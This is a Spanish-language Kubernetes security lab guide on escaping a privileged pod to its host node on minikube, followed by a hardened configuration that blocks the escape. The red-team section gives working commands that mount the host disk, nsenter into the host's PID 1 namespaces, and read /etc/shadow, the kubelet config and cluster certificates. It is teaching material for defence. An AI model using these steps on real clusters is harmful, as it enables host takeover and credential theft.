# Lab 4: Pod Privilegiado — Container Escape

## Objetivo

Demostrar como un Pod con `hostPID: true`, `hostNetwork: true` y `privileged: true`
permite un escape completo del contenedor al host subyacente, dando acceso total
al nodo de Kubernetes.

| Propiedad        | Valor                                         |
|------------------|-----------------------------------------------|
| **Namespace**    | `lab4-escape`                                 |
| **Ataque**       | hostPID + privileged -> montar host -> chroot |
| **Defensa**      | PSA restricted + drop ALL + non-root          |
| **Dificultad**   | Intermedia                                    |

---

## Requisitos

- minikube corriendo (`minikube start`)
- kubectl configurado

---

## Parte 1: Escenario Vulnerable (Red Team)

### Paso 1 — Desplegar el pod privilegiado

```bash
kubectl apply -f vulnerable-privileged.yaml

kubectl get pods -n lab4-escape
kubectl wait --for=condition=Ready pod/privileged-pod -n lab4-escape --timeout=120s
```

### Paso 2 — Verificar acceso a procesos del host

```bash
# Entrar al pod privilegiado
kubectl exec -it privileged-pod -n lab4-escape -- bash

# Ver TODOS los procesos del host (hostPID: true)
ps aux | head -20

# Verificar que estamos como root
whoami
id
```

### Paso 3 — Escape: Montar el filesystem del host

```bash
# Dentro del pod: crear punto de montaje
mkdir -p /mnt/host

# Montar el disco raiz del host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/vda1 /mnt/host 2>/dev/null

# Si lo anterior falla, intentar con nsenter (mas confiable en minikube)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Ahora estamos en el host!
cat /etc/hostname
cat /etc/os-release
```

### Paso 4 — Leer informacion sensible del host

```bash
# Leer shadow (hashes de passwords)
cat /etc/shadow

# Leer configuracion de kubelet
cat /var/lib/kubelet/config.yaml 2>/dev/null

# Ver certificados del cluster
ls /etc/kubernetes/pki/ 2>/dev/null

exit
exit
```

---

## Parte 2: Escenario Seguro (Blue Team)

### Paso 1 — Limpiar el escenario vulnerable

```bash
kubectl delete -f vulnerable-privileged.yaml
```

### Paso 2 — Desplegar el pod hardened

```bash
kubectl apply -f secure-privileged.yaml

kubectl get pods -n lab4-escape
kubectl wait --for=condition=Ready pod/hardened-pod -n lab4-escape --timeout=120s
```

### Paso 3 — Verificar que el escape NO es posible

```bash
kubectl exec -it hardened-pod -n lab4-escape -- sh

# Intentar ver procesos del host
ps aux
# Resultado: solo ve sus propios procesos (PID namespace aislado)

# Intentar montar filesystem
mount /dev/sda1 /mnt 2>&1
# Resultado: Permission denied

# Verificar usuario
whoami
id
# Resultado: uid=101 (no root)

# Intentar escalar privilegios
su -
# Resultado: Permission denied

exit
```

### Paso 4 — Verificar Pod Security Admission

```bash
# Intentar crear un pod privilegiado en el namespace protegido
kubectl run test-escape --image=ubuntu:22.04 -n lab4-escape \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"test","image":"ubuntu:22.04","securityContext":{"privileged":true}}]}}'
# Resultado: Error - violates PodSecurity "restricted"
```

---

## Diferencias Clave

| Aspecto                    | Vulnerable        | Seguro                 |
|----------------------------|-------------------|------------------------|
| `hostPID`                  | `true`            | `false`                |
| `hostNetwork`              | `true`            | `false`                |
| `privileged`               | `true`            | `false`                |
| `runAsNonRoot`             | No (root)         | `true` (uid 101)       |
| `readOnlyRootFilesystem`   | No                | `true`                 |
| `capabilities`             | Todas             | `drop: ["ALL"]`        |
| `seccompProfile`           | Ninguno           | `RuntimeDefault`       |
| `allowPrivilegeEscalation` | Default (true)    | `false`                |
| PSA Label                  | Ninguno           | `restricted`           |

---

## Limpieza

```bash
kubectl delete namespace lab4-escape
```
